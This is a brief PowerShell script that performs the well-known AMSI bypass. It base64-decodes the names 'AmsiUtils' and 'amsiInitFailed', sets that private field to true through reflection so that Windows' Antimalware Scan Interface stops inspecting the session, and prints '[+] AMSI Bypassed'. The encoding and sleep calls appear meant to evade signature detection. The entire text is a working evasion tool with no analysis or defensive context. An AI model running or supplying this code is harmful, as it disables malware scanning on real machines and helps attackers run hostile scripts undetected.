function base64d
{
	param($encoded)
	$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
	return $decoded
}

$A = base64d("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM=")
Start-Sleep 5

$B = base64d("YW1zaUluaXRGYWlsZWQ=")
Start-Sleep 5

$C = base64d("Tm9uUHVibGljLFN0YXRpYw==")
Start-Sleep 5

[Ref].Assembly.GetType($A).GetField($B,$C).SetValue($null,$true)
Write-Host "[+] AMSI Bypassed"
